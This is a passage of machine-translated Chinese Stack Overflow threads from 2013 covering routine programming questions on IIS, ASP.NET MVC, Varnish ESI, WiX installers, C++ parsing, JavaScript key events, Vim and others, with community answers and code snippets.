> 时间：2013-01-15T22:36:44.020

您需要授予 IUSR 帐户访问和执行`C:\app.exe`. [此链接](http://www.iis.net/learn/get-started/planning-for-security/understanding-built-in-user-and-group-accounts-in-iis)应为您提供找到正确帐户的必要信息。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T22:51:17.797

您可能已授予“ApplicationPoolIdentity”权限，而不是实际对应于该应用程序池的虚拟帐户。通读[微软的描述](http://www.iis.net/learn/manage/configuring-security/application-pool-identities)或在线搜索虚拟身份IIS等。

在您的开发机器上，您可能拥有某种完全管理员权限，因此不受限制。

如果在那之后您仍然有问题，我建议您在运行[进程监视器](http://technet.microsoft.com/en-us/sysinternals/bb896645)的情况下复制错误，这样您就可以准确地看到哪个进程正在使用哪个身份访问哪个资源。但是，我建议在您的开发机器上复制该问题，而不是在生产中运行 Process Monitor。需要一点点学习才能有效地运行它。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-06-26T21:36:01.343

在 IIS 7/8 中，进入**控制面板**/程序和功能/打开或关闭 Windows 功能，并**检查以下所有项目**：Web 管理工具，（包括：IIS 管理服务、II 6 管理兼容性）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-05-22T16:30:27.827

这个解决方案对我有用==>

[http://blogs.msdn.com/b/jpsanders/archive/2009/05/13/iis-7-adsi-error-system-runtime-interopservices-comexception-0x80005000-unknown-error-0x80005000.aspx?CommentPosted=真的#commentmessage](http://blogs.msdn.com/b/jpsanders/archive/2009/05/13/iis-7-adsi-error-system-runtime-interopservices-comexception-0x80005000-unknown-error-0x80005000.aspx?CommentPosted=true#commentmessage)

# asp.net-mvc - MVC：仅在某些视图上需要模型参数

> ID：14348144
> 
> 赞同：4
> 
> 时间：2013-01-15T22:31:38.187
> 
> 标签：asp.net-mvc, annotations, required

为模型定义参数后

```
[Required(AllowEmptyStrings = false, ErrorMessage = "No null")]
[DisplayName("Name")]
public string Name { get; set; } 
```

是否可以为某些视图更改此参数的属性？例如，我希望这些属性（必需的属性）适用于 view1、view2 和 view3，但不适用于 view4。我可以为 view3 禁用此属性吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-15T22:55:08.707

> 是否可以为某些视图更改此参数的属性？

不，属性在编译时被烘焙到程序集中。

正确的方法是使用视图模型：

```
public class CreateViewModel
{
    [DisplayName("Name")]
    public string Name { get; set; }
}

public class EditViewModel
{
    [Required(AllowEmptyStrings = false, ErrorMessage = "No null")]
    [DisplayName("Name")]
    public string Name { get; set; }
} 
```

并且在从 2 个视图提交表单时将调用的您各自的控制器操作将与视图模型一起使用：

```
public ActionResult Create(CreateViewModel model)
{
    ... the name will not be required here
    if (ModelState.IsValid)
    {

    }
}

public ActionResult Edit(EditViewModel model)
{
    ... the name will be required here
    if (ModelState.IsValid)
    {

    }
} 
```

替代方法将包括自定义模型绑定器或实现`IValidatableObject`接口，并根据当前操作进行一些动态验证。简而言之，你正在走向深渊。就个人而言，这不是我会搞砸的事情，但是如果您不喜欢我推荐的解决方案，请随时朝那个方向探索。

# session - 如何在 2 个 Heroku 应用程序之间共享会话？

> ID：14348150
> 
> 赞同：1
> 
> 时间：2013-01-15T22:32:00.713
> 
> 标签：session, heroku, rack

[在Cookie 和 Redis 会话存储之间有什么区别](https://stackoverflow.com/questions/14347540/what-is-the-difference-between-a-cookie-and-redis-session-store)的上下文中？，如何在 Heroku 应用程序之间共享会话数据（带有 Rack API 后端的 Sinatra 前端）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-16T21:00:05.133

我认为您想要做的是使用外部会话存储（例如 Redis），只需将 Redis 环境值从第一个应用程序复制到第二个应用程序。然后，您应该能够从两个 Heroku 应用程序访问相同的会话数据。

编辑1：

我还想到，由于它是两个单独的 Heroku 应用程序，您将（可能）拥有两个单独的域/子域。您需要确保您的会话 cookie 允许来自两个域的访问。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-16T15:07:29.787

这两个问题对如何做到这一点有建议：

*   [在有/没有自定义域的 Heroku 上，子域会话在 Rails 2.3 和 Rails 3 中不起作用？](https://stackoverflow.com/questions/5340989/subdomain-session-not-working-in-rails-2-3-and-rails-3-on-heroku-with-without-a)
*   [Rails Checkout SSL heroku](https://stackoverflow.com/questions/4606041/rails-checkout-ssl-heroku)

# caching - 边缘边的限制在一页内包含？

> ID：14348151
> 
> 赞同：0
> 
> 时间：2013-01-15T22:32:01.227
> 
> 标签：caching, varnish, esi

目前，我们有一项基于各种获取参数创建 XML 页面的服务。随着参数数量的增加，不同组合的数量也在增加，这意味着我们的清漆缓存中的命中率下降了。我们增加了 TTL，因此命中率也增加了，但我正在考虑以下想法：

我刚刚遇到 Edge Side Includes 并在想.. 如果我每次生成包含 50 个元素的 XML 页面，我是否可以生成一个包含 50 个 ESI 的页面，然后清漆将合并到一个文档中？

为什么要问 50 个 ESI 元素？因为每个 XML 元素本身很容易被一个 URL 缓存，但是过滤器的组合会导致生成大量不同的完整 XML 文档。

因此，即使一个请求过滤掉了前 10 个 XML 元素（因为它们没有确认获取参数），因为使用了 ESI，每个元素都将从缓存中获取。

这在服务器上会有多重？这样做有意义吗？ESI 是否非常昂贵，在这种情况下它没有意义。

**更新**

* * *

首先，我们从未耗尽内存，Nuke 为零。我们目前的命中/未命中率为 0.4，ttl 为 4 小时，在我看来这很糟糕……由于所有这些组合（国家、地区等）。更糟糕的是，tomcat 已达到 100% 的利用率并挂起，而 varnish 则停留在 1-3% 的研究中。我的直觉说，用清漆缝合 ESI，并记住子文档将更好地保护 tomcat 并增加我们的容量。我们从来没有奇怪地 Nuke 项目，这意味着在缓存条目过期之前它永远不会填充 ~ 1GB 缓存。我敢肯定，如果我们缓存每个子文档，我们可能会达到内存限制并开始核对项目......但是清漆不使用某种最近最少使用的算法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-17T18:04:28.473

对于有大量不同查询组合的缓存集合，通常不是最好的决定。很可能，某些查询组合的访问频率比其他查询组合要高得多（例如，有很多 SEO 汁液的组合，或者您在您的网站上分发/共享链接/具有链接的组合，或者与您的用户更相关的组合)，因此应该有选择地缓存这些内容。仅将所有内容缓存为长 ttl 的问题是，如果 url 空间很大，您可能会耗尽内存和经常访问的核资源，以支持缓存不经常访问的内容。

每页包含的 ESI 没有限制，假设 xml 子文档的命中率非常高，您描述的方法是一个很好的策略。varnish 中的缓存命中非常轻量级，因此即使一个页面由 50 个缓存命中组合而成，我认为与没有缓存相比，它的性能会非常好。如果 esi 包含的子文档的命中率很低，并且每个页面上都有大量的子文档，那么这将导致比每次只让后端渲染子文档的性能更差。我肯定会建议对以下场景进行一些负载测试，以便您做出明智的决定：

1.  没有缓存，后端每次都渲染子文档。
2.  ESI 将子文档呈现为片段，0% 缓存命中。
3.  ESI 将子文档呈现为片段，50% 的缓存命中。
4.  ESI 将子文档呈现为片段，100% 缓存命中。

这将很好地说明随着命中率的下降，性能将如何下降（它可能不是线性的，因此执行 0%、50%、100%），并且还告诉您理论上缓存可以提高多少性能。在我看来，最好的解决方案似乎是 esi 的某种组合：包括定期访问的子文档的“工作集”中的片段，如果子文档不在工作集中，则直接在后端呈现子文档。

# php - 如何将目录结构作为 API 读取

> ID：14348152
> 
> 赞同：0
> 
> 时间：2013-01-15T22:32:13.250
> 
> 标签：php, api, rest

如果您正在编写一个典型的 php 脚本，它位于您指向 url 的目录中。API 响应对树下目录的请求，例如 /api/feeds/80320。我假设 php 代码存在于 api 目录中，并且它读取它从 /feeds/80320 收到请求。怎么做的？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T22:38:16.143

**将您的所有请求重定向到一个 php 脚本。**

在 apache 中你可以这样做 >

```
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME} !-f
RewriteRule ^(.*)$ /index.php [L] 
```

然后在 PHP 脚本中解析`$_SERVER['REQUEST_URI'];`并施展你的魔法。

# xcode - 用于 Windows 的 Git 不断损坏

> ID：14348153
> 
> 赞同：1
> 
> 时间：2013-01-15T22:32:16.750
> 
> 标签：xcode, git, cordova, jquery-mobile

我正在使用 jQuery Mobile、PhoneGap、使用 Xcode 导出和使用 GIT for windows 的源代码控制来构建应用程序。

我显然做错了什么，因为在 5-10 次提交之后，存储库变得损坏，我不能再使用它了，这是第 5 次或第 6 次，我的应用程序变得非常先进，而且我没有任何记录随着时间的推移所做的改变。事实上，在这一点上，这个应用程序的源代码控制是一个失败的原因。

提交并不特别，实际上我可以更改一两行，它会很好地工作，下一行或两行：提交失败！

有没有人遇到这个问题，你找到原因了吗？

实际上尝试提交会产生：

> 提交失败 - 无法创建新提交

git fsck 产生：

> 检查对象目录：100% (256/256)，完成。从树 'long alphanumeric ' 到树 'long alphanumeric '的链接
> 断开 缺少树“长字母数字”

我已经重新启动了我的回购大约十几次，每次都会在一天中途发生这种情况......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T23:07:24.293

*   您**必须使用 ,**测试您的存储`git fsck`库
*   您*可以*在其他位置克隆 repo 并尝试使用克隆
*   您*可以*更改 Git-client（也许会有所帮助，但我对此表示怀疑）
*   您*可以*将 Git 发送到垃圾箱并使用另一个 SCM

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-17T08:13:39.043

使用 GitExtensions - 更好更实用！

# php - 查询多个 MySQL 表并将数据编码为 JSON

> ID：14348154
> 
> 赞同：0
> 
> 时间：2013-01-15T22:32:20.770
> 
> 标签：php, mysql, json

我承认，我不知道关于 MySQL 查询或 JSON 的大量信息，但我想知道。目前，当我从数据库中获取数据时，我查询一个表，该表将值带入另一个查询，依此类推。我认为这不是接收我需要显示的所有数据的最佳做法。下面是我的 MySQL 查询当前如何在 PHP foreach 函数中工作的示例： ![在此处输入图像描述](../Images/f6f8cb561c00839f513923de2edcde8e.png)

那么，有没有更好的方法来完成我想要的查询以及如何将其编码为 JSON？

任何帮助将不胜感激，谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T22:48:12.080

据我了解，您的代码正在执行以下操作：

```
<?php
$friends = query("SELECT Friends");
while($row = fetch_object($friends)){
    $friend_dets = query("SELECT Friend_dets WHERE Friend_ID = $row->Friend_ID");
    $output[] = fetch_assoc($friend_dets);
}
echo json_encode($output);
?> 
```

有了这个，你使过程比它需要的更复杂。您可以通过一个查询获得所需的所有信息，`JOIN`如下所示：

```
SELECT Name, Status, WhateverElseYouWant
FROM Friends
    JOIN Profiles ON (Friends.friend-profile-id = Profiles.profile-id)
WHERE Friends.profile-id = MyCurrentProfileID 
```

这将为您提供所有与`MyCurrentProfileID`. 然后，您只需将结果放入一个数组`json_encode`中即可：

```
<?php
$friends = query($QueryFromAbove);
while($row = fetch_object($friends)){
    $output[] = fetch_assoc($friend_dets);
}
echo json_encode($output);
?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T22:47:37.487

您可以对此列表进行 1 个 SQL 查询，您能告诉我您的表 Friends 和 Profiles 信息是什么吗？

在 Friends 表中，您必须有配置文件的 id 以表明是什么配置文件的朋友。

查询可能像：select profile.* from profile, friends, where friends.id_profile = profile.id and profile.id = current-profile-id

在您的图表中，您使用好友表中的当前个人资料 ID 而不是个人资料，这可能是错误的

# installation - 如何让 WiX 安装程序请求管理权限？

> ID：14348156
> 
> 赞同：23
> 
> 时间：2013-01-15T22:32:26.017
> 
> 标签：installation, wix, elevated-privileges

我们有一个内部开发的程序。我们正在升级以使用 Visual Studio 2012，因此必须保留 Visual Studio 安装程序项目。如果已经安装了应用程序，InstallShield LE 会给我们带来快捷方式问题。这让我最终选择了 WiX。

我已经对此进行了几天的研究，并阅读了几篇关于如何获得管理员权限的帖子，但它们似乎都不起作用。该`Package`元素具有 InstallPrivileges="1" 并且存在以下`Property`元素：

```
<Property Id="MSIUSEREALADMINDETECTION" Value="1" /> 
```

它在启动时不会请求管理员权限，因此在尝试在`C:\Program Files(x86)`.

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2013-06-14T13:11:26.540

**关于如何让 WiX 安装程序请求管理权限的**答案

 **[Opus Krokus](https://stackoverflow.com/users/1821388/opus-krokus)在[评论](https://stackoverflow.com/questions/14348156/how-to-get-wix-installer-to-request-administrative-privileges#comment20050114_14348156)中找到的解决方案。

**回答**

> 我添加了以下内容（到 Package 元素），我不确定哪个（或什么组合）给了我我需要的东西，但它现在可以工作：InstallPrivileges="elevated" AdminImage="yes" InstallScope="perMachine"

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-02-18T14:45:38.913

看看[这个 Stack Overflow 问题](https://stackoverflow.com/questions/6122282/wix-installer-should-always-run-as-administrator)的答案。

以下是答案的精髓：

```
<Property Id="MSIUSEREALADMINDETECTION" Value="1" /> 
```

Opus Krokus 建议的解决方案对我不起作用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2019-07-31T11:55:20.767

您需要 2 个命令：

```
<Property Id="MSIUSEREALADMINDETECTION" Value="1" />     

<Condition Message="Installation requires Administrator privileges">
    <![CDATA[Privileged]]>
</Condition> 
```

请注意，您必须`Privileged`用`<![CDATA[` 和 包围`]]>`。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-10-10T13:19:31.417

这对我有用，因为我为在 Windows 7（及更高版本）上安装而创建的 MSI：

```
 <!-- Set per-machine installation as default.
  See See http://msdn.microsoft.com/en-us/library/dd408007.aspx for an explanation of ALLUSERS=2 and MSIINSTALLPERUSER="".
  -->
  <Property Id="ALLUSERS" Value="2" />
  <!-- Needs to be empty value (and empty value must be commented out to get rid of error message when compiling):
  <Property Id="MSIINSTALLPERUSER" Value="" /> 
  --> 
```

如上述 XML 注释中所述，有关详细信息，请参阅[http://msdn.microsoft.com/en-us/library/dd408007.aspx](http://msdn.microsoft.com/en-us/library/dd408007.aspx)。**

# c++ - 从 .txt 文件访问双精度

> ID：14348160
> 
> 赞同：0
> 
> 时间：2013-01-15T22:32:38.170
> 
> 标签：c++

我有一个 .txt 文件，如下所示：

```
(0.781860352, -11.6927013, 7.20992613)  
(0.364501476, -9.41256046, 6.87873077)  
(0.394773483, -7.85253429, 6.90275288) 
```

我需要一个代码来分别从每一行访问每个双精度。我在解决这个问题时遇到了麻烦。有任何想法吗？

谢谢！

更新：

所以，就像我说的，我使用 Kerrek SB 的建议从每一行访问每个双精度数，然后我将这些值存储到向量的组件中，然后我访问每个组件并执行一个操作（比如将它们相乘），并且将结果存储到数组中；最后我添加了数组的内容。无论如何，这是代码：

```
int main() {

    //=============================
    //Initial Declarations
    //=============================

Vector3 r(0,0,0);
int num = 0 , i;
string line;
char c, d1, d2, d3, d4;
double v1, v2, v3 , b[num];

   //=============================
   //Counting Lines in File
   //=============================

ifstream is;
is.open ("data.txt");
while (is.good())
{
c = is.get();
if (c=='\n')num++;
}
is.close();
cout<<"Number of lines in file is "<<num<<endl;

   //=============================
   //Getting Data
   //=============================

ifstream infile("data.txt");

for (line ,i=0 ; getline(infile, line), i<=num-1;i++ )
{

    istringstream iss(line);

    if (!((iss >> d1 >> v1 >> d2 >> v2 >> d3 >> v3 >> d4 >> ws) &&
          iss.get() == EOF                                           &&
          d1 == '(' && d2 == ',' && d3 == ',' && d4 == ')'))
    {

    }

    // Placing data in vector
    r[0] = v1;
    r[1] = v2;
    r[2] = v3;

    //Placing data from vector into array
    b[i] = r[0]*r[1]*r[2];

}

  // Adding contents of array
  valarray <double> bfinal (b,num);
  double b_final = bfinal.sum();

cout<< b[0] << "," << b[1] << ", " << b_final << endl;
return 0; 
```

}

代码有效（实际上它没有正确添加数组的内容），但看起来有点粗糙。我觉得它可以被简化和/或更简洁。有任何想法吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-01-15T22:36:28.733

标准 C++ 习语：

```
#include <string>
#include <fstream>
#include <sstream>
#include <iostream>

std::ifstream infile("data.txt");

for (std::string line; std::getline(infile, line); )
{
    char d1, d2, d3, d4;
    double v1, v2, v3;
    std::istringstream iss(line);

    if (!((iss >> d1 >> v1 >> d2 >> v2 >> d3 >> v3 >> d4 >> std::ws) &&
          iss.get() == EOF                                           &&
          d1 == '(' && d2 == ',' && d3 == ',' && d4 == ')'))
    {
        // error parsing "line"
        std::cerr << "Sorry, could not parse '" << line << "'. Skipping.\n";
        continue;
    }

    std::cout << "You said: " << v1 << ", " << v2 << ", and " << v3 << "\n";
} 
```

# c# - 氪套件查询

> ID：14348163
> 
> 赞同：-1
> 
> 时间：2013-01-15T22:32:45.973
> 
> 标签：c#, krypton-toolkit, krypton

我一直在使用 Krypton Suite/Toolkit 受益匪浅，但我一直想知道为什么会有免费版本。这只是一个试验，最终会被删掉，还是只是某些 100% 免费的元素，它是如何工作的。

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T22:41:55.780

在 Component Factory 网站上，我会说[Krypton Toolkit](http://www.componentfactory.com/product?id=3)是完全免费的。

如果您想使用 Ribbon、Navigator、Workspace 或 Docking 组件，或者需要 Krypton Toolkit 的源代码，则需要购买。

# php - csv 加载器错误 - WordPress 插件？

> ID：14348166
> 
> 赞同：0
> 
> 时间：2013-01-15T22:33:01.107
> 
> 标签：php, wordpress, plugins, csv

我正在使用这个 WordPress 插件。

```
http://allaerd.org/woocommerce-csv-importer 
```

当我尝试使用图像加载 csv（它们是 .jpg 格式）时，我收到以下错误。

```
Fatal error: Cannot use object of type WP_Error as array in /home/*******/public_html/**********/wp-content/plugins/woocommerce-csvimport/include/woocommerce-csvimport-functions.php on line 218 
```

所以我尝试了不同的选择。就像将列分隔符更改为 | 和其他东西。但没有运气。我替换了所有 | 使用逗号，并确保文本的其余部分没有会破坏列顺序的逗号。仍然没有运气，我得到了同样的错误。

我尝试使用 csv 和 2 jpg 图像中的 2 个产品，但又遇到了同样的错误。

帮助？

# java - 了解 Java 声音 API：在混音器上查找 MIC

> ID：14348169
> 
> 赞同：1
> 
> 时间：2013-01-15T22:33:03.657
> 
> 标签：java, audio, voice, javasound, mixer

我正在尝试找到支持麦克风耳机插孔的特定混音器。请让我知道我在代码中做错了什么。我不完全明白我需要做什么。

```
 Mixer.Info[] mixerInfo = AudioSystem.getMixerInfo();
    Mixer myMixer;

    for(int i = 0; i < mixerInfo.length; i++){

        //System.out.println("Name: " + mixerInfo[i].getName());
        myMixer = AudioSystem.getMixer(mixerInfo[i]);

    if(myMixer.isLineSupported(Port.Info.MICROPHONE)){
        System.out.println("Mic is supported!");
    }

    } 
```

这段代码对我来说很有意义，但它永远不会返回“支持麦克风”。我确实有一个耳机麦克风插孔，一切都应该工作。只是为了让您知道我正在使用 Fedora，我知道 Java 在过去的平台上工作方式不同。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T23:00:19.903

我创建了一个新项目来调试您的代码，一开始它不会打印“支持麦克风”但是当我在 Windows 音频面板的**录音设备**中启用我的麦克风时（因为我有 Windows ...）它向我展示了“支持麦克风”，所以我建议您检查您的麦克风是否处于启用状态

我认为这个[链接](http://forums.fedoraforum.org/showthread.php?t=263826)对你有用，检查你的麦克风是否启用或类似的东西..

# javascript - 如何检查是否已按下某个键？

> ID：14348175
> 
> 赞同：6
> 
> 时间：2013-01-15T22:33:24.683
> 
> 标签：javascript, events, dom-events

好吧，我在 Google 上进行了搜索，但仍然没有找到我想要的答案。

我想检查用户是否按下了一个键，像这样 -

```
if(document.onkeyup) {
   // Some Stuff here
} 
```

我知道我可以这样做，这样-

```
document.onkeyup = getKey; 
```

但是该函数`getKey`不能返回值。

那么如何检查用户是否按下了某个键呢？

编辑：我需要纯Javascript来做这件事..

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-15T22:39:34.743

您可以使用事件对象在纯 Javascript 中执行此操作，而无需 jQuery 等外部库。

要捕获键码，只需将事件作为 getKey 函数的参数传递：

```
function getKey(e)
{
    window.alert("The key code is: " + e.keyCode);
}

document.onkeyup = getKey; 
```

## **常用keyCode列表：**

有关 keyCode 的有用列表，您可以查看此 URL：

[http://www.cambiaresearch.com/articles/15/javascript-char-codes-key-codes](http://www.cambiaresearch.com/articles/15/javascript-char-codes-key-codes)

## **将 keyCode 设置为全局变量：**

如果您有兴趣捕获 keyCode 以供以后使用，您可以执行以下操作：

```
var keycode = "";

(...)

function getKey(e)
{
    keycode = e.keyCode;
}

document.onkeyup = getKey;

window.alert("The key code is: " + keycode); 
```

## **将 keyCode 设置为事件源对象：**

如果你不喜欢全局变量，比如我，你也可以这样做：

```
function getKey(e)
{
    keycode = e.keyCode;

    var objectFromEvent = e.currentTarget ? e.currentTarget : event.srcElement;

    objectFromEvent.customProperty = keycode;
}

document.customProperty = "";
document.onkeyup = getKey;

// now the value is in the "customProperty" of your object =)

window.alert("The key code is: " + document.customProperty); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-15T22:44:51.620

您可以做到的一种方法是使用变量，然后您可以检查该变量是否是其他变量...

例如

```
 var keypressed = "";
    document.onkeyup = function(e){

    if (typeof event !== 'undefined') {
        keypressed = event.keyCode;
      }
      else if (e) {
        keypressed = e.which;
      }  

  return false;   // Prevents the default action

} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-15T22:40:07.377

您必须将事件附加到窗口全局对象并设置侦听事件的函数。此示例向您展示如何跟踪`keyup`和`keydown`事件。

```
window.addEventListener('keydown', onKeyDown, true);
window.addEventListener('keyup', onKeyUp, true);

function onKeyDown(evt) {
  // key up event as been fired
  console.log(evt.keyCode);
}

function onKeyUp(evt) {
  // key up event as been fired
  console.log(evt.keyCode);
} 
```

有关更多详细信息，请参阅MDN 上的[element.addEventListener 。](https://developer.mozilla.org/fr/docs/DOM/element.addEventListener)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-15T22:43:32.470

你真的不应该这样做，但如果你真的必须：

```
var getKey = (function () {
  var currentKey = null;

  document.onkeyup = function (event) {
    // determine the pressed key (across browsers)
    // by inspecting appropriate properties of `event`
    // and update currentKey; E.g:
    currentkey = event.which ? event.which : window.event.keyCode;
  }

  return function () {
    return currentkey;
  }
})(); 
```

这将为您提供最后按下的关键用户。

如果您需要获取当前按下的键（直到释放），那么您需要附加`keydown`事件以更新`currentKey`变量和`keyup`事件以将其设置为`null`.

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-01-15T22:37:02.597

我会使用 jquery 并做这样的事情：

```
 // arrow keys click
$(document).keyup(function(e) {
    // left arrow
    if (e.keyCode == "37" ) {
        // left stuff
    // right arrow
    } else if (e.keyCode == "39") {
        // right stuff
    // up arrow
    } else if (e.keyCode == "38") {
        // up stuff
    // down arrow
    } else if (e.keyCode == "40") { 
        // down stuff
    }
}); 
```

等等，对于这里看到的不同的关键代码[http://www.cambiaresearch.com/articles/15/javascript-char-codes-key-codes](http://www.cambiaresearch.com/articles/15/javascript-char-codes-key-codes)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2017-06-14T16:29:15.737

如果您尝试运行事件以测试何时按下某个键，则可以使用它。

```
document.addEventListener('keydown', function(event) {
    var key_code = event.keyCode;
    if (key_code === 38) {
        alert('test);
    } 
}); 
```

# vim - Vim - 导航到下一个不同的缩进

> ID：14348177
> 
> 赞同：4
> 
> 时间：2013-01-15T22:33:31.087
> 
> 标签：vim

Vim 中有没有一种方法可以导航到下一个不同的缩进级别？

因此，例如从这里到那里：

```
-> var a = 1;
   var b = 2;
   var func = function(){
->     return a + b;
   } 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-16T12:04:29.110

这应该适用于由空格（而不是制表符）组成的缩进：

```
call search('^ \{0,'.eval(indent(".")-1).'}\S\|^ \{'.eval(indent(".")+1).',}\S') 
```

这由两个正则表达式组成：

*   `^ \{0,'.eval(indent(".")-1).'}\S`使用与前面空格的`\{n,m}`from `n`to匹配的结构匹配较小的缩进。`m`
*   `^ \{'.eval(indent(".")+1).',}\S'`匹配更大的缩进，使用`\{n,}`至少匹配`n`前面空格的结构。

正则表达式夹在中间`^`并且`\S`仅应用于行上的前导空格。然后它们由`\|`('OR') 运算符连接。

当然，`search()`为方便起见，可以将呼叫映射到组合键。

**编辑**

Chris Johnsen 指出调用 to`eval()`是多余的，所以命令可以简化为：

```
call search('^ \{0,'.(indent(".")-1).'}\S\|^ \{'.(indent(".")+1).',}\S') 
```

# r - 将列表堆叠到R中的矩阵中

> ID：14348187
> 
> 赞同：0
> 
> 时间：2013-01-15T22:34:02.447
> 
> 标签：r, list, concatenation

我正在尝试以一种不错的格式从大型棒球数据库中获取一些数据。这是一个 MySQL 数据库，所以我使用 RMySQL 来访问它。

问题是，检索我需要的数据的最简单方法是使用 sapply，因为我需要更改索引：

```
myf <- function(ab){
search <- paste('select pitch_type, des from pitches where ab_id=', ab)
query <- dbSendQuery(con2,search)
return(fetch(query,n=-1))
}

pitches <- sapply(players$ab_id,myf,simplify="array") 
```

但是很难访问这些数据，因为它返回一个列表列表：

```
> mode(pitches[,1])
>[1] "list" 
```

由于我在每个列表中有两列不同长度的列，是否有一种简单的方法可以将所有这些列堆叠到矩阵/数据框中？我尝试了很多事情都没有成功。

谢谢！

# jquery - 从孩子的班级名称获取父宽度

> ID：14348190
> 
> 赞同：0
> 
> 时间：2013-01-15T22:34:23.600
> 
> 标签：jquery, html

有没有使用子元素的类名来获取元素的宽度？

```
 <td width='100%' nowrap='1' style='padding-left:2px; margin:2px;'>
     <font class='DialogHeaderTitleFont'>RudimentalDrumming.com Jackets</font>
 </td> 
```

在上面的代码中，我想通过使用元素的类名“.DialogHeaderTitleFont”来获取元素的宽度，这可能吗？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T22:36:30.690

您可以使用`.width`函数来获取元素的宽度。

```
$('.DialogHeaderTitleFont').parent().width(); 
```

jQuery 提供了不同的`width`函数变体，例如`innerWidth`,`width`和`outerWidth`.. 有关更多详细信息，请查看此[Find out what the width of an image is using jQuery](https://stackoverflow.com/questions/10018669/find-out-what-the-width-of-an-image-is-using-jquery/10018686#10018686)

**编辑：**错过了你想要父元素的宽度。[谢谢@Kevin](https://stackoverflow.com/questions/14348190/getting-parent-td-width-from-childs-class-name/14348227#comment19946638_14348227)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T22:38:02.903

是的，只需使用 .parent();

```
$(".DialogHeaderTitleFont").parent().css("width"); 
```

请记住，如果您在文档变量中的任何地方重复此类可能会更改，因此我建议您使用某种唯一标识符，例如 id 而不是类

# android - 在创建自己的 Android AppStore 时，我是否必须与 Google 分摊收入？

> ID：14348195
> 
> 赞同：0
> 
> 时间：2013-01-15T22:34:51.550
> 
> 标签：android, revenue-sharing

我知道，在使用 Android Market 发布应用程序时，Google 会保留 30% 的收入。但是在拥有自己的应用商店的情况下，收入流程是如何运作的，我在哪里可以了解更多信息？感谢您对此的任何帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T23:09:22.207

如果您不通过 Google Play 市场分发您的应用，则无需分享您的任何收入。

在 Android 上，不需要通过 Play Market 分发您的应用程序 - 即。它与 iPhone 不同，在 iPhone 上获取应用程序的唯一方法是通过 App Store。您可以通过任何可以分发 Jar 文件的方式分发您的应用程序（通过网站、通过电子邮件发送、在拇指驱动器上等）。

因此，如果您想避免向 Google 支付费用，请不要通过应用市场出售它。在大多数情况下，这将导致下载数量显着减少。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T22:55:47.297

[https://support.google.com/googleplay/android-developer/bin/answer.py?hl=en&answer=112622&ctx=cb&src=cb&cbid=-115fdogjadeww](https://support.google.com/googleplay/android-developer/bin/answer.py?hl=en&answer=112622&ctx=cb&src=cb&cbid=-115fdogjadeww)

交易费用是实际使用 Google Play 分发您的应用程序的费用。拥有 Android 应用程序不是收费的。该应用程序可以是任何东西，包括另一个 App Store。

这可能就是为什么 Google 不允许您在 Google Play 上分发替代 App Store 的原因，这样他们就不必担心分配收入。:)

# vim - 我可以仅在当前缓冲区中更改 ColorColumn 的颜色吗？

> ID：14348208
> 
> 赞同：2
> 
> 时间：2013-01-15T22:35:25.297
> 
> 标签：vim

在我的 ftplugin/python.vim 文件中，我有这两行：

```
setlocal colorcolumn=81
highlight ColorColumn guibg=#222222 
```

效果很好，但是列的颜色是全局设置的。是否可以*仅在当前缓冲区中设置它？*

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-16T04:18:09.593

不，你不能。但是您可以创建一个解决方法：使用在 BufEnter 事件上运行的自动命令，并在那里检查您是否正在进入目标缓冲区，如果是则进行更改`hi ColorColumn`，如果不是则恢复该值。请注意，虽然您不能在不同的窗口中让颜色列具有不同的颜色，因此此更改将重新着色所有颜色列，而不仅仅是当前窗口中显示的颜色列。

# uiwebview - 在后台加载 webview

> ID：14348209
> 
> 赞同：0
> 
> 时间：2013-01-15T22:35:28.660
> 
> 标签：uiwebview, tabbar, appdelegate

我有一个标签栏应用程序，当它启动时，不同的标签栏上有网络视图。该应用程序需要速度，因此当有人打开并加载到第一个标签栏时，我需要在后台加载其他 Web 视图以在应用程序启动时加载。我的 UIWebView 之一被命名为 twitter，它位于“SecondViewController”上。我假设代码在 appDelegate 中，非常感谢基本形式的帮助，因为我的知识不是很好。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T22:40:54.037

UIWebViews 不能在屏幕外呈现。您可以做的最好的事情是缓存上次访问内容的图像并呈现该图像，然后加载 Web 视图并在两者之间交叉淡入淡出。

# vb6 - 如何将错误传递回调用函数？

> ID：14348215
> 
> 赞同：0
> 
> 时间：2013-01-15T22:35:59.553
> 
> 标签：vb6, error-handling

VB6 中将错误传递回调用函数的最佳方法是什么？

```
1    On Error Resume Next
2    ' do something
